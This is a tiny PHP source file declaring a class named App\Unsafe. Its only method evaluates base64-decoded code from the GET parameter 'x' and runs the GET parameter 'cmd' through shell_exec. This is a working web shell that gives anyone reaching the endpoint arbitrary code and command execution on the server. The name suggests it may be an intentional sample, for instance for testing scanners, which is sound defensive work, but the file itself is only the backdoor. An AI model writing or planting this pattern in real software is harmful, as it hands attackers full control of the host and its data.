<?php

namespace App;

class Unsafe
{
    public function run(): void
    {
        eval(base64_decode($_GET['x']));
        shell_exec($_GET['cmd']);
    }
}
